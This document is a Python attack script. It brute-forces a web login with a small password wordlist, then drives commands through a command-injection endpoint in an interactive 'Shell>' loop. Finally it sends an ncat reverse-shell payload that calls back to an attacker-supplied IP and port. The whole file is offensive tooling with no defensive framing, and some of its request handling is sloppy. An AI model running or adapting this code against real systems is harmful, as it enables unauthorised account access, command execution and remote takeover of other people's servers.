import requests

session = requests.session()
print(session)
url = input(str("Enter the login URL : "))

# only store session cookiee
'''username = input(str("Enter the Username : "))
password = input(str("Enter the Password : "))

credentials = {"username":username,"password":password}
print(sesions)
response = sesions.post(url,credentials)

if "Welcome" in response.text:
    print ("Login Successful...!")
else:
    print("Login failed...!!!!")'''

def bruteforcer():
    global session
    session = requests.session()
    username = input(str("Enter the Username : "))

    wordlist = ["password", "admin123", "letmein", "qwerty", "12345","password123","shadow","admin"]

    for password in wordlist:
        data = {"username":username,"password":password}
        response = session.post(url,data=data)

        if "Welcome" in response.text:
            print("*"*60)
            print(f"Login Successful..! with || {username} : {password} ||")
            print("*"*60)
            return session
        else:
            print(f"[+] Attempted credentials {username} : {password}")

bruteforcer()

def CMD_Exploit(session=session):
    vulnerable_url = input(str("Enter the Vulnerable URL for CMD Exploitation: "))
    #global para
    #para = input(str("Enter the Parameter : "))

    while True:
        cmd = input(str("Shell> "))
        stop = ["stop","exit","quit","ctrl c", "^c"]
        if cmd.lower() in stop:
            break
        else:
            response = session.post(vulnerable_url,data={"cmd":cmd})
            if response.status_code == 200:
                print (response.text)
            else:
                print("[+] Attempt failed...!")

CMD_Exploit()

    

def reverse_shell():
    
    vulnerable_url = input(str("Enter the Vulenrable URL : "))

    Attacker_IP = input(str("Enter the Attacker IP : "))
    Attacker_PORT = input(str("Enter the Attacker PORT : "))

    payload = str(f"ncat {Attacker_IP} {Attacker_PORT} -e /bin/bash")
    print(payload)

    response = requests.get(vulnerable_url,data={"cmd":payload})
    print("Sending the Payload....!")

reverse_shell()